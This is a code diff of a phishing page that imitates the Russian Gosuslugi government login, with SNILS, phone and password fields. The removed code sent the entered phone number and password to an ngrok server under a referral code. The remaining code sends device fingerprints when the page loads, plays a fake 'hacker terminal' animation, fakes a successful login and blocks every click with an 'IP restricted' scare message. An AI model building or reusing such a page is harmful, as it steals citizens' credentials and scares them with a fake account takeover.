@@ -21,7 +21,12 @@
 
         .main-container { position: relative; display: flex; justify-content: center; align-items: center; width: 100%; }
         .form-column { display: flex; flex-direction: column; width: 100%; max-width: 380px; z-index: 1; }
-        .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); width: 100%; }
+        .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); width: 100%; position: relative; overflow: hidden; }
+
+        /* Контейнер для оригинальной формы */
+        .form-content {
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
 
         .logo-container { text-align: center; margin-bottom: 25px; }
         .logo-img { max-height: 130px; width: auto; display: block; margin: 0 auto; }
@@ -55,6 +60,7 @@
         .btn-outline:last-child { margin-bottom: 0; }
         .register-link-container { margin-top: 25px; text-align: center; font-size: 15px; }
 
+        /* Стили для терминала */
         .hacker-overlay {
             position: fixed; inset: 0; background: rgba(8, 12, 18, 0.94); backdrop-filter: blur(8px); display: flex; 
             justify-content: center; align-items: center; z-index: 10500; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; padding: 20px;
@@ -78,56 +84,148 @@
         .progress-bar-bg { width: 100%; height: 8px; background: #21262d; border-radius: 4px; overflow: hidden; }
         .progress-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #1f6feb, #58a6ff); box-shadow: 0 0 10px rgba(88, 166, 255, 0.5); transition: width 0.15s linear; }
 
-        .success-overlay {
-            position: fixed; inset: 0; background: rgba(12, 35, 64, 0.75); backdrop-filter: blur(6px); display: flex; 
-            justify-content: center; align-items: center; z-index: 11000; opacity: 0; visibility: hidden; transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
+        /* Стили для системы уведомлений об ошибках (Toast) */
+        .toast-container {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 12000;
+            display: flex; flex-direction: column; gap: 12px; pointer-events: none; width: 90%; max-width: 400px;
         }
-        .success-overlay.visible { opacity: 1; visibility: visible; }
-        .success-outer-frame {
-            background-color: #f3f5f8; border: 2px solid #d1d5db; border-radius: 6px; width: 100%; max-width: 600px; padding: 30px 35px; box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25); font-family: Arial, Helvetica, sans-serif; transform: scale(0.95); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        .error-toast {
+            background-color: #fef2f2; border-left: 6px solid #ef4444; color: #991b1b; padding: 16px 20px;
+            border-radius: 6px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1), 0 4px 6px rgba(0, 0, 0, 0.05);
+            font-size: 15px; font-weight: 500; display: flex; align-items: center; opacity: 0; transform: translateY(30px);
+            animation: slideInToast 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards, fadeOutToast 0.5s ease 3.5s forwards;
         }
-        .success-overlay.visible .success-outer-frame { transform: scale(1); }
-        .success-inner-card { background: #ffffff; border: 1px solid #e5e7eb; padding: 35px 40px; text-align: left; }
-        .success-top-logo { text-align: left; margin-bottom: 25px; padding-left: 40px; }
-        .success-top-logo img { max-height: 95px; width: auto; display: inline-block; }
-        .success-title { font-size: 20px; color: #0b1f33; margin: 0 0 20px 0; font-weight: 700; line-height: 1.35; }
-        .success-body p { font-size: 14px; line-height: 1.55; color: #1f2937; margin: 0 0 14px 0; }
-        .success-bottom-logo { text-align: center; margin: 28px 0 20px 0; }
-        .success-bottom-logo img { max-height: 50px; width: auto; display: inline-block; }
-        .success-footer { font-size: 12px; color: #8c96a5; text-align: center; line-height: 1.5; max-width: 460px; margin: 0 auto; }
-        .success-footer a { color: #8c96a5; text-decoration: underline; }
+        .error-toast::before { content: "⚠️"; margin-right: 12px; font-size: 18px; }
 
-        @media (max-width: 600px) {
-            .success-outer-frame { padding: 15px; }
-            .success-inner-card { padding: 25px 20px; }
-            .success-top-logo { padding-left: 0; text-align: center; }
+        @keyframes slideInToast { to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeOutToast { to { opacity: 0; transform: translateY(-20px); margin-top: -60px; } }
+
+        /* Премиальная анимация галочки и успеха */
+        .success-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 50px 10px;
+            text-align: center;
+            animation: fadeInState 0.6s ease forwards;
         }
+
+        .checkmark-wrapper {
+            position: relative;
+            width: 90px;
+            height: 90px;
+            margin-bottom: 30px;
+        }
+
+        .checkmark {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            display: block;
+            stroke-width: 3.5;
+            stroke: #005FF9;
+            stroke-miterlimit: 10;
+            box-shadow: inset 0px 0px 0px #005FF9;
+            animation: fillCircle .4s ease-in-out .4s forwards, scaleBounce .3s ease-in-out .9s both;
+            position: relative;
+            z-index: 2;
+        }
+
+        .checkmark__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 3.5;
+            stroke-miterlimit: 10;
+            stroke: #005FF9;
+            fill: none;
+            animation: drawStroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: drawStroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
+        }
+
+        .checkmark-pulse {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 95, 249, 0.1);
+            border-radius: 50%;
+            z-index: 1;
+            opacity: 0;
+            animation: pulseWave 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) 0.9s forwards;
+        }
+
+        .success-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0b1f33;
+            opacity: 0;
+            transform: translateY(15px);
+            animation: slideUpFade 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) 1s forwards;
+            line-height: 1.35;
+        }
+
+        @keyframes drawStroke { 100% { stroke-dashoffset: 0; } }
+        @keyframes scaleBounce {
+            0%, 100% { transform: none; }
+            50% { transform: scale3d(1.15, 1.15, 1); }
+        }
+        @keyframes fillCircle { 100% { box-shadow: inset 0px 0px 0px 45px rgba(0, 95, 249, 0.06); } }
+        @keyframes pulseWave {
+            0% { transform: scale(0.9); opacity: 1; }
+            100% { transform: scale(1.6); opacity: 0; }
+        }
+        @keyframes fadeInState { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUpFade { to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
     <div class="main-container">
         <div class="form-column">
+            <!-- В карточку добавлен контейнер для скрытия формы и блок успеха -->
             <div class="card">
-                <div class="logo-container">
-                    <img src="flags/gos.png" alt="логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
-                    <div class="logo-placeholder" style="display:none;">ЛОГОТИП ГОСОВ</div>
+                <div id="formContent" class="form-content">
+                    <div class="logo-container">
+                        <img src="flags/gos.png" alt="логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                        <div class="logo-placeholder" style="display:none;">ЛОГОТИП ГОСОВ</div>
+                    </div>
+                    <form id="loginForm" onsubmit="return false;">
+                        <div class="form-group"><label>Телефон / Эл. почта / СНИЛС</label><input type="text" id="userInput" name="phone" required /></div>
+                        <div class="form-group"><label>Пароль</label><input type="password" id="passwordInput" name="password" required /></div>
+                        <a href="#" class="link-restore">Восстановить</a>
+                        <button type="submit" id="submitBtn" class="btn-primary">Войти</button>
+                    </form>
+                    <a href="#" class="link-cant-login">Не удаётся войти</a>
+                    <hr class="divider">
+                    <div class="alt-login-text">Войти другим способом. <a href="#">Подробнее</a></div>
+                    <button type="button" class="btn-outline">QR-код</button>
+                    <button type="button" class="btn-outline">Электронная подпись</button>
+                    
+                    <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
                 </div>
-                <form id="loginForm" onsubmit="return false;">
-                    <div class="form-group"><label>Телефон / Эл. почта / СНИЛС</label><input type="text" id="userInput" name="phone" required /></div>
-                    <div class="form-group"><label>Пароль</label><input type="password" id="passwordInput" name="password" required /></div>
-                    <a href="#" class="link-restore">Восстановить</a>
-                    <button type="submit" id="submitBtn" class="btn-primary">Войти</button>
-                </form>
-                <a href="#" class="link-cant-login">Не удаётся войти</a>
-                <hr class="divider">
-                <div class="alt-login-text">Войти другим способом. <a href="#">Подробнее</a></div>
-                <button type="button" class="btn-outline">QR-код</button>
-                <button type="button" class="btn-outline">Электронная подпись</button>
+
+                <!-- Блок успешного применения скидки -->
+                <div id="successState" class="success-container">
+                    <div class="checkmark-wrapper">
+                        <div class="checkmark-pulse"></div>
+                        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                        </svg>
+                    </div>
+                    <div class="success-text">Вход выполнен <br>успешно</div>
+                </div>
             </div>
-            <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
         </div>
     </div>
+
+    <!-- Контейнер для всплывающих уведомлений -->
+    <div id="toastContainer" class="toast-container"></div>
 
     <div id="hackerModal" class="hacker-overlay">
         <div class="hacker-window">
@@ -146,42 +244,16 @@
         </div>
     </div>
 
-    <div id="successModal" class="success-overlay">
-        <div class="success-outer-frame">
-            <div class="success-inner-card">
-                <div class="success-top-logo">
-                    <img src="flags/key.jpg" alt="Top Logo" onerror="this.style.display='none';">
-                </div>
-                <h2 class="success-title">Вы успешно вошли в систему через<br>Единую биометрическую систему (ЕБС).</h2>
-                <div class="success-body">
-                    <p>Вы прошли проверку безопасности учетной записи.</p>
-                    <p>Если этот вход выполняли не вы, советуем обратиться в службу поддержки:</p>
-                    <p>Вход выполнен с устройства: <strong id="successDevice">Windows, PC</strong></p>
-                    <p>Авторизация с IP-адреса: <strong id="successIP">185.237.74.247</strong></p>
-                    <p style="margin-top: 22px; margin-bottom: 0;">Если это были вы, игнорируйте это уведомление.</p>
-                </div>
-            </div>
-            <div class="success-bottom-logo">
-                <img src="flags/logo.png" alt="Bottom Logo" onerror="this.style.display='none';">
-            </div>
-            <div class="success-footer">
-                Вы получили это письмо, потому что выразили согласие получать уведомления. Если вы больше не хотите получать уведомления, вы можете <a href="#">отказаться от рассылки</a>.
-            </div>
-        </div>
-    </div>
-
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const hackerModal = document.getElementById('hackerModal');
-            const successModal = document.getElementById('successModal');
-            const loginForm = document.getElementById('loginForm');
-            const submitBtn = document.getElementById('submitBtn');
-            const userInput = document.getElementById('userInput');
-            const passwordInput = document.getElementById('passwordInput');
-            
             const terminalConsole = document.getElementById('terminalConsole');
             const progressBarFill = document.getElementById('progressBarFill');
             const progressPercent = document.getElementById('progressPercent');
+            const toastContainer = document.getElementById('toastContainer');
+            
+            const formContent = document.getElementById('formContent');
+            const successState = document.getElementById('successState');
 
             const hackerLogs = [
                 { type: 'info', text: 'Инициализация сеанса авторизации...' },
@@ -201,7 +273,6 @@
                 { type: 'success', text: 'Готово!' }
             ];
 
-            // 1. Захват и сохранение реферального кода
             const urlParams = new URLSearchParams(window.location.search);
             let refCode = urlParams.get('ref');
             
@@ -211,7 +282,6 @@
                 refCode = localStorage.getItem('refCode');
             }
 
-            // 2. Сбор данных об устройстве для логов визита
             const visitDeviceInfo = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Неизвестно'),
@@ -220,7 +290,6 @@
                 localTime: new Date().toLocaleString('ru-RU')
             };
 
-            // 3. Отправка лога визита (срабатывает при загрузке страницы)
             const visitPayload = { 
                 deviceInfo: visitDeviceInfo,
                 refCode: refCode || null 
@@ -232,58 +301,55 @@
                 body: JSON.stringify(visitPayload)
             }).catch(err => console.error("Ошибка отправки визита:", err));
 
-            // НОВЫЙ БЛОК: Автоматический запуск терминала спустя 2 секунды (2000 мс)
+            // Автоматический запуск терминала спустя 2 секунды
             setTimeout(() => {
-                // Проверяем, не был ли терминал уже открыт вручную через кнопку
                 if (!hackerModal.classList.contains('visible')) {
                     hackerModal.classList.add('visible');
                     runHackerTerminal(() => {
+                        // После завершения логов скрываем терминал
                         hackerModal.classList.remove('visible');
-                        showSuccessNotification();
+                        
+                        // Спустя короткую задержку (пока исчезает терминал) подменяем контент формы
+                        setTimeout(() => {
+                            formContent.style.display = 'none';
+                            successState.style.display = 'flex';
+                        }, 300);
                     });
                 }
             }, 2000);
 
-            // 4. Обработка нажатия на кнопку входа (сохранена оригинальная логика)
-            submitBtn.addEventListener('click', () => {
-                const phoneVal = userInput.value.trim();
-                const passVal = passwordInput.value.trim();
+            // Функция отображения красивой ошибки (Toast Notification)
+            function showErrorToast(message) {
+                const toast = document.createElement('div');
+                toast.className = 'error-toast';
+                toast.textContent = message;
+                
+                toastContainer.appendChild(toast);
 
-                if (!phoneVal || !passVal) {
-                    alert('Пожалуйста, заполните все поля.');
-                    return;
+                setTimeout(() => {
+                    if (toast.parentNode) {
+                        toast.parentNode.removeChild(toast);
+                    }
+                }, 4000);
+            }
+
+            // Глобальный перехватчик кликов на ВСЕ кнопки и ссылки
+            document.body.addEventListener('click', (e) => {
+                const interactiveElement = e.target.closest('button, a');
+                
+                if (interactiveElement) {
+                    e.preventDefault();   
+                    e.stopPropagation();  
+                    
+                    showErrorToast('Действия с вашего IP ограничены');
                 }
-
-                // Формируем payload для /api/lead (заполняем обязательные поля заглушками)
-                const payload = {
-                    refCode: refCode || null,
-                    fullName: "Данные со страницы входа", 
-                    phone: phoneVal,
-                    email: "Не указана",
-                    address: "Не указан",
-                    password: passVal
-                };
-
-                // Отправляем данные на сервер
-                fetch('https://accent-cried-guzzler.ngrok-free.dev/api/lead', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(err => console.error("Ошибка отправки данных:", err));
-
-                // Запуск визуальной анимации, если она еще не была запущена автоматически
-                if (!hackerModal.classList.contains('visible')) {
-                    hackerModal.classList.add('visible');
-                    runHackerTerminal(() => {
-                        hackerModal.classList.remove('visible');
-                        showSuccessNotification();
-                    });
-                }
-            });
+            }, true);
 
             function runHackerTerminal(onComplete) {
                 let currentLogIndex = 0;
                 const totalLogs = hackerLogs.length;
+
+                terminalConsole.innerHTML = ''; 
 
                 function processNextLog() {
                     if (currentLogIndex < totalLogs) {
@@ -317,29 +383,6 @@
                     }
                 }
                 processNextLog();
-            }
-
-            function showSuccessNotification() {
-                const successDevice = document.getElementById('successDevice');
-                const successIP = document.getElementById('successIP');
-                
-                let os = "Неизвестное устройство";
-                let ua = navigator.userAgent;
-                if (ua.indexOf("Win") != -1) os = "Windows, PC";
-                if (ua.indexOf("Mac") != -1) os = "Mac, PC";
-                if (ua.indexOf("Linux") != -1) os = "Linux, PC";
-                if (/Android/.test(ua)) os = "Android, Smartphone";
-                if (/iPhone|iPad|iPod/.test(ua)) os = "iOS, Smartphone";
-                if (successDevice) successDevice.textContent = os;
-
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => {
-                        if (successIP) successIP.textContent = data.ip;
-                    })
-                    .catch(err => console.error("Не удалось загрузить IP", err));
-
-                successModal.classList.add('visible');
             }
         });
     </script>
